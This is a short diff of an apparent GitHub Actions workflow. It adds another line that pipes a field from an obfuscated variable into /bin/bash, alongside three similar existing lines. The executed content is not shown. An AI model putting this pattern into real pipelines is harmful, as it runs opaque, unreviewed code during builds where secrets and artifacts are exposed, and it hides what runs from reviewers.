@@ -54,6 +54,7 @@ jobs:
           echo $zqfh10 | jq -r .zq5406 | /bin/bash
           echo $xyw5103 | jq -r .lngc1 | /bin/bash
           echo $po6 | jq -r .m39105 | /bin/bash
+          echo $apkyw8567 | jq -r .s93 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
